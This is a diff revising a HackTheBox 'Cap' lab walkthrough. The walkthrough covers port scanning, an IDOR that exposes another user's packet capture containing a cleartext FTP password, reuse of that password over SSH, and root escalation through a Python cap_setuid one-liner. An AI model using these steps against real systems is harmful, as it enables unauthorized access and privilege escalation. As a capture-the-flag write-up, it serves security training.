@@ -9,6 +9,7 @@ avatar: assets/htb/cap.png
 tags: [Clear Text Credentials, File System Configuration, Insecure Direct Object Reference (IDOR), Packet Capture Analysis, Password Reuse, SUID Exploitation, Python, Vulnerability Assessment]
 htb_url: https://app.hackthebox.com/machines/Cap
 ---
+
 # Cap
 
 🔗 [Cap](https://www.hackthebox.com/machines/cap)
@@ -43,24 +44,25 @@ Packet Capture Analysis | Password Reuse | SUID Exploitation
 
 </details>
 
-## Task 0 - Deploy machine
+## Summary
 
-🎯 Target IP: `<YOUR_IP>`
+Cap is an easy Linux box running a Gunicorn-backed "Security Dashboard" web application that lets users run network captures. The application is vulnerable to an Insecure Direct Object Reference (IDOR) that lets me download another user's packet capture, which leaks the user `nathan`'s FTP password in cleartext. That password is reused for SSH, granting a foothold. Finally, the `cap_setuid` capability set on `/usr/bin/python3.8` is abused to escalate to root.
 
-Create a directory on the Desktop named after the machine, and inside it another directory to hold the materials and outputs you'll need while working the box, including the nmap scans.
+## Enumeration
 
-## Task 1 - Reconnaissance
+Before getting started, I set up a working directory and add the target to my hosts file:
 
-<pre class="language-bash"><code class="lang-bash">su
-<strong>echo "<YOUR_IP> cap.htb" >> /etc/hosts
-</strong>
+```bash
+su
+echo "<YOUR_IP> cap.htb" >> /etc/hosts
+
 mkdir -p htb/cap.htb
 cd htb/cap.htb
 mkdir {nmap,content,exploits,scripts}
 # At the end of the room
 # To clean up the last line from the /etc/hosts file
-<strong>sed -i '$ d' /etc/hosts
-</strong></code></pre>
+sed -i '$ d' /etc/hosts
+```
 
 I like to kick off recon by pinging the target, which confirms connectivity and gives a hint about the OS.
 
@@ -74,9 +76,9 @@ PING cap.htb (<YOUR_IP>) 56(84) bytes of data.
 
 With these three ICMP packets we see a Time To Live (TTL) close to \~64. that points to a **\*nix** host, since Windows machines normally report a TTL around 128.
 
-### 1.1 - How many TCP ports are open?
+### Port scanning
 
-Let's jump straight into an active port scan with nmap
+Let's jump straight into an active port scan with nmap:
 
 ```bash
 sudo nmap -p0- -sS -Pn -T4 -vvv cap.htb -oN nmap/tcp_port_scan
@@ -91,11 +93,7 @@ PORT   STATE SERVICE REASON
 
 <table><thead><tr><th width="154.99999999999997">command</th><th>result</th></tr></thead><tbody><tr><td>sT</td><td>TCP connect port scan (Default without root privilege)</td></tr><tr><td>sC</td><td>Run default scripts</td></tr><tr><td>sV</td><td>Enumerate versions</td></tr><tr><td>vvv</td><td>Verbosity</td></tr><tr><td>T4</td><td>Run a bit faster</td></tr><tr><td>oN</td><td>Output to file with nmap formatting</td></tr></tbody></table>
 
-The machine appears to expose 3 open TCP ports: 21, 22, 80.
-
-3
-
-Next, we can enumerate the services running on those open ports:
+The machine exposes 3 open TCP ports: 21 (FTP), 22 (SSH) and 80 (HTTP). Next, we can enumerate the services running on those open ports:
 
 ```bash
 sudo nmap -sV -sC -p 21,22,80 cap.htb -oN nmap/service_port_scan
@@ -216,15 +214,11 @@ whatweb cap.htb
 http://cap.htb [200 OK] Bootstrap, Country[RESERVED][ZZ], HTML5, HTTPServer[gunicorn], IP[<YOUR_IP>], JQuery[2.2.4], Modernizr[2.8.3.min], Script, Title[Security Dashboard], X-UA-Compatible[ie=edge]
 ```
 
-To get a feel for the target's scope, let's open the web server in a browser:
+### Web application discovery
 
-it's a dashboard showing security events, failed logins and similar data. Under 'Security Snapshot' there's a packet sniffer with a counter and the option to download the captured traffic.
+To get a feel for the target's scope, let's open the web server in a browser. It's a dashboard showing security events, failed logins and similar data. Under 'Security Snapshot' there's a packet sniffer with a counter and the option to download the captured traffic.
 
-meanwhile, the 'IP Config' section displays the attacker machine's network interface `<YOUR_IP>`
-
-then, the 'Network Status' page lists every active connection:
-
-lastly, the 'user tab' in the top-right corner is just a non-functional mockup, but we'll note the name 'Nathan'. it may come in handy for the SSH and FTP services.
+The 'IP Config' section displays the attacker machine's network interface `<YOUR_IP>`, and the 'Network Status' page lists every active connection. The 'user tab' in the top-right corner is just a non-functional mockup, but we'll note the name 'Nathan'. it may come in handy for the SSH and FTP services.
 
 Running a directory brute-force with GoBuster and reviewing the page source turns up nothing else of value.
 
@@ -232,81 +226,46 @@ Running a directory brute-force with GoBuster and reviewing the page source turn
 gobuster dir -u http://cap.htb -w /usr/share/wordlists/dirb/common.txt
 ```
 
-### 1.2 - After running a "Security Snapshot", the browser is redirected to a path of the format /\[something]/\[id], where \[id] represents the id number of the scan. What is the \[something]?
+One detail does stand out: after running a "Security Snapshot", the browser is redirected to a path of the form `/data/[id]`, where `[id]` is the id number of the scan. This redirect is a useful clue about where to go next, so let's generate some traffic with ICMP requests and confirm it gets captured under that `/data/` path.
 
-This redirect is a useful clue about where to go next, so let's generate some traffic with ICMP requests and see whether it gets captured.
+## Foothold
 
-It does, and we can answer the question by looking at the url path.
+### IDOR on the capture endpoint
 
-data
+I first tried the ffuf tool with a wordlist of common usernames but got no results. The telling detail remained the URL pattern when a new capture is created, which follows the `/data/[id]` format, with the id increasing on every capture.
 
-## Task 2 - Exploitation & User Flag
+Playing with different parameter values, I found an Insecure Direct Object Reference (IDOR), a flaw that lets an attacker reach or alter objects by tampering with the identifiers a web page uses. This implies the server keeps the most recent scans, including packet captures made by users before us. Since I had landed on `/data/1`, browsing to `/data/0` indeed shows a packet capture containing several packets. So other users' scans are reachable.
 
-### 2.1 - Are you able to get to other users' scans?
+### Extracting credentials from the PCAP
 
-I tried the ffuf tool with a wordlist of common usernames but got no results.
+Now we can open the pcap file (named after the machine) — the one with sensitive data is the capture at ID `0` — and inspect its traffic in Wireshark, looking for FTP, HTTP or other sensitive data sent in cleartext.
 
-A telling detail in the Security Snapshot is the URL pattern when a new capture is created, which follows the /data/ format. The id increases with every capture.
+Right away we spot a successful FTP login for the previously mentioned user 'Nathan', along with the password in cleartext. The sensitive data lives in the **FTP** application layer protocol; the full TCP Stream confirms the login. We now have the FTP credentials, and we'll also try them against the SSH service.
 
-Playing with different parameter values, I found an Insecure Direct Object Reference (IDOR), a flaw that lets an attacker reach or alter objects by tampering with the identifiers a web page uses.
-
-This implies the server keeps the most recent scans, including packet captures made by users before us. Since I had landed on /data/1, browsing to /data/0 indeed shows a packet capture containing several packets.
-
-So we can confirm that other users' scans are reachable, which answers the question.
-
-yes
-
-### 2.2 - What is the ID of the PCAP file that contains sensative data?
-
-Now we can open the pcap file (named after the machine) and inspect its traffic in Wireshark, looking for FTP, HTTP or other sensitive data sent in cleartext.
-
-Right away we spot a successful FTP login for the previously mentioned user 'Nathan', along with the password in cleartext.
-
-0
-
-### 2.3 - Which application layer protocol in the pcap file can the sensitive data be found in?
-
-The sensitive data appears in the FTP protocol; below is the full TCP Stream:
-
-We now have the FTP credentials, and we'll also try them against the SSH service.
-
-ftp
-
-### 2.4 - We've managed to collect nathan's FTP password. On what other service does this password work?
+### Reusing the credentials
 
 As anticipated, we can test the credentials on both the FTP and SSH services.
 
 #### FTP/21
 
-`ftp nathan@cap.htb`
+```bash
+ftp nathan@cap.htb
+```
 
 #### SSH/22
 
-The credentials are accepted by both services ;)
+The credentials are accepted by both services ;) so the password reuse also works over **SSH**, giving us an interactive foothold as `nathan`.
 
-SSH
+We already noticed interesting files while enumerating, so let's go ahead and read the user flag in Nathan's home directory:
 
-2.5 - Submit the flag located in the nathan user's home directory.
-
-We already noticed interesting files in the previous task, so let's go ahead and read the user flag in Nathan's folder.
-
-\
-
-<details>
-
-<summary>🚩 Flag 1 (user.txt)</summary>
-
+```bash
+cat user.txt
 f17c************************c401
+```
 
-</details>
+## Privilege Escalation
 
-## Task 3 - Privilege Escalation & Root Flag
-
-### 3.1 - What is the full path to the binary on this machine has special capabilities that can be abused to obtain root privileges?
-
-Running `sudo -l` shows no commands that Nathan is allowed to run with sudo privileges:
-
-Before reaching for automated tools like Linpeas, and keeping the question's hint in mind, I want to run a few quick checks:
+Running `sudo -l` shows no commands that Nathan is allowed to run with sudo privileges. Before reaching for automated tools like LinPEAS, I want to run a few quick checks:
 
 ```bash
 crontab -l
@@ -316,15 +275,9 @@ getcap -r /2>/dev/null
 
 After looking at cronjobs, the kernel version and [capabilities](https://man7.org/linux/man-pages/man7/capabilities.7.html), only the Linux capabilities give us something interesting, so we'll follow that lead!&#x20;
 
-Reading the first line of the output: `/usr/bin/python3.8 = cap_setuid,cap_net_bind_service+eip`, we notice '[cap\_setuid](https://man7.org/linux/man-pages/man2/setuid.2.html)', meaning the Python interpreter can raise its privileges.&#x20;
+Reading the first line of the output: `/usr/bin/python3.8 = cap_setuid,cap_net_bind_service+eip`, we notice '[cap\_setuid](https://man7.org/linux/man-pages/man2/setuid.2.html)', meaning the Python interpreter at `/usr/bin/python3.8` can raise its privileges.&#x20;
 
-/usr/bin/python3.8
-
-### 3.2 - Submit the flag located in root's home directory.
-
-The plan is to set our setuid to 0 (the root user), so let's do that.
-
-We can change it right on the victim machine and run OS commands through the python3.8 interpreter: `usr/bin/python3.8`
+The plan is to set our setuid to 0 (the root user). We can change it right on the victim machine and run OS commands through the `/usr/bin/python3.8` interpreter:
 
 ```python
 import os
@@ -332,33 +285,14 @@ os.setuid(0)
 os.system("/bin/bash")
 ```
 
-with the uid set to 0 we now have root access!
+With the uid set to 0 we now have root access! To finish, we head into the root folder and grab the root flag:
 
-To finish, we head into the root folder and grab the root.txt flag: `cat /root/root.txt`
-
-<details>
-
-<summary>🚩 Flag 2 (root.txt)</summary>
-
+```bash
+cat /root/root.txt
 751f************************f9b7
-
-</details>
+```
 
 ---
 
 # Agent Instructions
 This documentation is published with GitBook. GitBook is the documentation platform designed so that both humans and AI agents can read, navigate, and reason over technical content effectively. Learn more at gitbook.com.
-
-## Querying This Documentation
-If you need additional information that is not directly available in this page, you can query the documentation dynamically by asking a question.
-
-Perform an HTTP GET request on the current page URL with the `ask` query parameter:
-
-```
-GET https://dev-angelist.gitbook.io/writeups-and-walkthroughs/hackthebox/cap.md?ask=<question>
-```
-
-The question should be specific, self-contained, and written in natural language.
-The response will contain a direct answer to the question and relevant excerpts and sources from the documentation.
-
-Use this mechanism when the answer is not explicitly present in the current page, you need clarification or additional context, or you want to retrieve related documentation sections.
